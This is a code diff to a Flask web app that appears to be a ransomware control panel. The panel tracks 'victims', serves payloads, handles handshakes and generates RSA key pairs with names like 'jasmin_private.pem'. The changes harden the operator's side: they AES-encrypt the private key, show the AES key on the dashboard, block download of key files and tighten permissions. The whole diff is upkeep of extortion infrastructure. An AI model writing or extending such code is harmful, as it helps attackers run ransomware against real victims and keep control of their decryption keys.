@@ -164,8 +164,10 @@ def dashboard():
     total = q.count()
     victims = q.order_by(Victim.id.desc()).offset((page-1)*per_page).limit(per_page).all()
     total_pages = max(1, -(-total // per_page))
+    ks_path = os.path.join(PAYLOAD_DIR, '.key_secret')
+    aes_key = open(ks_path).read().strip() if os.path.exists(ks_path) else 'KEY_NOT_SET'
     return render_template('dashboard.html', victims=victims, page=page,
-        total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION)
+        total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION, aes_key=aes_key)
 
 # ── Handshake ──
 @app.route('/handshake', methods=['POST'])
@@ -231,6 +233,10 @@ def generate():
 
 @app.route('/payloads/<path:filename>')
 def download_payload(filename):
+    # Block plaintext private key and secret
+    base = os.path.basename(filename)
+    if base in ('jasmin_private.pem', '.key_secret'):
+        return 'Forbidden', 403
     return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)
 
 # ── Update Check ──
@@ -277,11 +283,29 @@ def keygen():
     key = rsa_gen.generate_private_key(65537, 2048, default_backend())
     priv = key.private_bytes(ser.Encoding.PEM, ser.PrivateFormat.TraditionalOpenSSL, ser.NoEncryption())
     pub = key.public_key().public_bytes(ser.Encoding.PEM, ser.PublicFormat.SubjectPublicKeyInfo)
+    # AES-256-CBC encrypt private key
+    import base64
+    aes_key = secrets.token_hex(16)  # 32 hex = 256 bit
+    iv = secrets.token_bytes(16)
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    cipher = Cipher(algorithms.AES(bytes.fromhex(aes_key)), modes.CBC(iv), default_backend())
+    enc = cipher.encryptor()
+    pad_len = 16 - (len(priv) % 16)
+    padded = priv + bytes([pad_len] * pad_len)
+    enc_priv = enc.update(padded) + enc.finalize()
+    enc_blob = base64.b64encode(iv + enc_priv).decode()
+    # Save files
     priv_path = os.path.join(PAYLOAD_DIR, 'jasmin_private.pem')
+    enc_path = os.path.join(PAYLOAD_DIR, 'jasmin_private.pem.enc')
     pub_path = os.path.join(PAYLOAD_DIR, 'jasmin_public.pem')
+    secret_path = os.path.join(PAYLOAD_DIR, '.key_secret')
     open(priv_path, 'wb').write(priv)
+    open(enc_path, 'w').write(enc_blob)
     open(pub_path, 'wb').write(pub)
-    return jsonify(ok=True, pub=pub.decode(), msg='密钥对已生成并保存到 payloads/ 目录')
+    open(secret_path, 'w').write(aes_key)
+    os.chmod(priv_path, 0o600)
+    os.chmod(secret_path, 0o600)
+    return jsonify(ok=True, pub=pub.decode(), msg='RSA-2048 密钥对已生成，私钥已AES-256加密存储')
 
 @app.route('/do_update', methods=['POST'])
 @login_required
